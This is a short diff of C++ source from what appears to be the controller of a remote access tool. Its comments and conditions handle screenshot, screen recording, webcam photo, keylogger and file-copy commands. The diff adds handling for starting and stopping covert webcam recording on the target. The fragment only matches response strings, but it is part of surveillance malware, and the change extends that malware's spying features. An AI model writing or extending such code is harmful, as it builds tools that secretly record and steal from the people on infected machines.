@@ -202,6 +202,8 @@ int main()
         // Check if server is sending a file (for screenshot, recording, webcam, keylogger, copyfile, list commands)
         if ((cmd == "screenshot" && response.find("Screenshot captured successfully") != std::string::npos) ||
             (cmd == "stop_record" && response.find("Screen recording stopped") != std::string::npos) ||
+            (cmd == "start_webcam_record" && response.find("Webcam recording started") != std::string::npos) ||
+            (cmd == "stop_webcam_record" && response.find("Webcam recording stopped") != std::string::npos) ||
             (cmd == "webcam_photo" && response.find("Webcam photo captured successfully") != std::string::npos) ||
             (cmd == "stop_keylogger" && response.find("Keylogger stopped") != std::string::npos) ||
             (cmd.find("copyfile") == 0 && response.find("File copied successfully") != std::string::npos) ||
